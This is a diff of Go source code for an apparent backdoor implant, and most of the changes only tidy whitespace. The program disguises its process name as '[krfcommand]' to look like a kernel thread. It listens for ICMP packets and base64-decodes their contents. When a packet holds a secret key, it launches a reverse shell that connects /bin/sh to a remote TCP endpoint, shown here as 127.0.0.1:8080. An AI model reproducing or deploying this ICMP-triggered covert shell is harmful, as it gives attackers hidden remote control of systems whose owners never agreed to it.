@@ -4,7 +4,7 @@ import (
 
 	"os/exec"
 	"time"
-	"fmt"	
+	"fmt"
 	"strings"
 	"encoding/base64"
 	"net"
@@ -12,7 +12,6 @@ import (
 	"unsafe"
 	"reflect"
 	"os"
-	
 )
 
 
@@ -38,14 +37,11 @@ func ChangeProcName(name string) error {
 // connectBack() is a function to initiate reverse shell
 func connectBack() {
 
-	
 	c, err := net.DialTimeout("tcp", "127.0.0.1:8080", time.Duration(5) * time.Second)
 	if err != nil {
 		if nil != c {
 			c.Close()
-			
 		}
-
 	}
 
 	cmd := exec.Command("/bin/sh")
@@ -56,21 +52,18 @@ func connectBack() {
 }
 
 
-
-
 func main() {
 	err := ChangeProcName("[krfcommand]")
 	if err != nil {
 		fmt.Println(err.Error())
 	}
 	// while True loop to listen for ICMP data
-	for { 
+	for {
 
 		protocol := "icmp"
 		netaddr, _ := net.ResolveIPAddr("ip4", "127.0.0.1")
 		conn, _ := net.ListenIP("ip4:"+protocol, netaddr)
 
-		
 
 		buf := make([]byte, 1024)
 		packetData, _, _ := conn.ReadFrom(buf)
@@ -78,7 +71,6 @@ func main() {
 		conn.ReadFrom(buf)
 		fmt.Println("[+] The full packet data:")
 		fmt.Printf("% X\n", buf[:packetData])
-		
 
 
 		//fmt.Printf("% X\n", buf[8:16])
@@ -94,13 +86,9 @@ func main() {
 		incomingMessage := fmt.Sprintf("%s", base64Text[:decode])
 
 		fmt.Printf("%s\n\n", base64Text[:decode])
-		//connectBack()
-		
 		// Make sure the incoming message has the secret key
 		if strings.Contains(incomingMessage, secretMessage) {
 			go connectBack()
-		
-		
 		}
 
 	}
